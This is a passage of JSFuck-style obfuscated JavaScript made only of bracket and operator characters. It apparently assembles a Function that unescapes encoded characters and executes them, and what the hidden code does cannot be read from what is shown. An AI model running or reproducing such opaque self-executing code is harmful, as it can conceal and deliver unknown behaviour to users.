(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+[])+(!+[]+!![]+[]))+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+[])+([]+{})[!+[]+!![]+!![]+!![]+!![]])+([][[]]+[])[+[]]+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(+{}+[])[+!![]]+(+[]+[])+([]+{})[!+[]+!![]]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+[])+([]+{})[!+[]+!![]+!![]+!![]+!![]])+([][[]]+[])[+[]]+(!+[]+!![]+!![]+!![]+!![]+[])+([][[]]+[])[!+[]+!![]+!![]]+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+([][[]]+[])[!+[]+!![]+!![]+!![]]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+[])+([]+{})[!+[]+!![]+!![]+!![]+!![]])+([][[]]+[])[+[]]+(!+[]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+[])+([]+{})[!+[]+!![]+!![]+!![]+!![]])+([][[]]+[])[+[]]+(!+[]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(+[]+[])+(+[]+[])+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+[])+([]+{})[!+[]+!![]+!![]+!![]+!![]])+([][[]]+[])[+[]]+(!+[]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(+!![]+[])+(+{}+[])[+!![]]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]